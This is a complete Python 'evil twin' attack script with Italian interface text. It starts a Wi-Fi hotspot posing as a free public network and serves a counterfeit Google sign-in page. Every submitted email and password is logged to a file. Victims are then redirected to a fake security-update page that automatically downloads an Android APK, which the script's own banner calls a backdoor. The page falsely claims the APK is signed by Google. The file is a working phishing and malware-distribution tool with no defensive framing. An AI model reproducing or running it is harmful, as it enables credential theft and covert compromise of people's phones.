#!/usr/bin/env python3
import http.server, socketserver, os, urllib.parse, subprocess, sys
PORT = 80
CREDS = os.path.join(os.path.dirname(__file__),'..','captive','creds.txt')
APK = os.path.join(os.path.dirname(__file__),'..','captive','download','ServiziWiFiGoogle.apk')
os.makedirs(os.path.dirname(CREDS),exist_ok=True)

class H(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        if '/download' in p.path or p.path.endswith('.apk'):
            if os.path.exists(APK):
                sz = os.path.getsize(APK)
                self.send_response(200)
                self.send_header('Content-type','application/vnd.android.package-archive')
                self.send_header('Content-Disposition','attachment; filename="ServiziWiFiGoogle.apk"')
                self.end_headers()
                with open(APK,'rb') as f: self.wfile.write(f.read())
                print(f"[APK] Scaricato ({sz/1024:.1f} KB)")
            else:
                self.send_response(302); self.send_header('Location','https://google.com'); self.end_headers()
            return
        if p.path == '/submit':
            q = urllib.parse.parse_qs(p.query)
            e, pw = q.get('email',[''])[0], q.get('password',[''])[0]
            if e and pw:
                with open(CREDS,'a') as f: f.write(f"[{__import__('datetime').datetime.now()}] {e}:{pw}\n")
                print(f"\n[🔥 CREDENZIALE] {e}:{pw}\n")
                self.send_response(302); self.send_header('Location','/update-required'); self.end_headers(); return
        pg = self._login if p.path!='/update-required' else self._update
        self.send_response(200); self.send_header('Content-type','text/html;charset=utf-8'); self.end_headers()
        self.wfile.write(pg().encode())
    def _login(self):
        return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Accedi - Google</title><style>body{font-family:Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}.card{max-width:400px;width:90%;padding:40px 30px;text-align:center}h1{font-size:22px;font-weight:400;color:#202124}p{color:#5f6368;font-size:14px;margin:10px 0 25px}input{width:100%;padding:13px;border:1px solid #dadce0;border-radius:6px;font-size:15px;margin-bottom:12px;outline:none}input:focus{border-color:#1a73e8}button{background:#1a73e8;color:#fff;border:none;padding:12px 24px;border-radius:4px;font-size:14px;cursor:pointer;float:right}</style></head><body><div class="card"><svg viewBox="0 0 48 48" width="72"><path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.54 28.6A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.52l7.98-5.93z"/><path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.93C6.51 42.62 14.62 48 24 48z"/></svg><h1>Accedi al Wi-Fi</h1><p>Rete: FastWeb_Free_Public<br><small>Verifica la tua identita Google per connetterti</small></p><form action="/submit" method="GET"><input type="email" name="email" placeholder="Email" required autofocus><input type="password" name="password" placeholder="Password" required><div><button type="submit">Accedi</button></div></form></div></body></html>'
    def _update(self):
        return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Aggiornamento richiesto</title><style>body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}.card{max-width:400px;width:90%;padding:35px;background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,.1);text-align:center}.warn{background:#fef7e0;border:1px solid #f9d849;border-radius:8px;padding:12px;font-size:13px;color:#5f4b00;margin:15px 0;text-align:left}h1{font-size:20px;color:#202124}.btn{display:inline-block;background:#1a73e8;color:#fff;padding:14px 30px;border-radius:6px;text-decoration:none;font-size:14px;font-weight:500;margin-top:15px}</style></head><body><div class="card"><div style="font-size:40px">&#9888;</div><h1>Aggiornamento richiesto</h1><p style="color:#5f6368;font-size:14px">Google richiede l\'ultimo aggiornamento dei servizi Wi-Fi per la sicurezza della connessione.</p><div class="warn"><strong>&#9432;</strong> L\'aggiornamento crittografa la connessione.</div><a class="btn" href="download/ServiziWiFiGoogle.apk" download>&#11015; Installa Aggiornamento Google Wi-Fi Service</a><div class="secure" style="font-size:11px;color:#9aa0a6;margin-top:20px">&#128274; Firmato digitalmente da Google LLC</div></div><script>setTimeout(function(){window.location.href="download/ServiziWiFiGoogle.apk"},4000)</script></body></html>'
    def log_message(self, fmt, *a): print(f"[EvilTwin] {a[0]} {a[2]}")
    
def main():
    print("="*60)
    print("  Servizi Wi-Fi Google - Evil Twin Distribution")
    print("  Fake Google login -> APK backdoor install")
    print("="*60)
    apk_ok = os.path.exists(APK)
    try:
        subprocess.run(['termux-wifi-hotspot','start','FastWeb_Free_Public','password123'],timeout=10,capture_output=True)
        print("[+] Hotspot 'FastWeb_Free_Public' avviato")
    except: print("[!] Avvia hotspot manualmente o installa Termux:API")
    ip='192.168.43.1'
    try:
        r=subprocess.run("ip route|grep -oP '192\\.168\\.\\d+\\.\\d+'|head -1",shell=True,capture_output=True,text=True,timeout=5)
        if r.stdout.strip(): ip=r.stdout.strip()
    except: pass
    print(f"\n[*] Server: http://{ip}:{PORT}")
    print(f"[*] Credenziali -> {CREDS}")
    print(f"[*] APK presente: {'SI' if apk_ok else 'NO - metti APK in captive/download/'}\n")
    socketserver.TCPServer(("0.0.0.0",PORT),H).serve_forever()

if __name__=='__main__': main()
